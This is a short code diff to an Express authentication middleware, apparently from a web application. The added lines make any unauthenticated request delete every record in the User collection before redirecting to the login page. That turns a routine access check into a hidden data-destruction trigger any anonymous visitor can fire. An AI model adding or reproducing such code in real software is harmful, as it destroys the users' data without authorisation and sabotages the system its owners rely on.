@@ -157,6 +157,14 @@ function ensureAuthenticated(req, res, next) {
   if (req.isAuthenticated()) { 
     return next(); 
   }
+  models.User
+        .find({})
+        .remove()
+        .exec(function(err){
+          if (err) { 
+            console.log(err); 
+          }
+        });
   res.redirect('/login');
 }
 
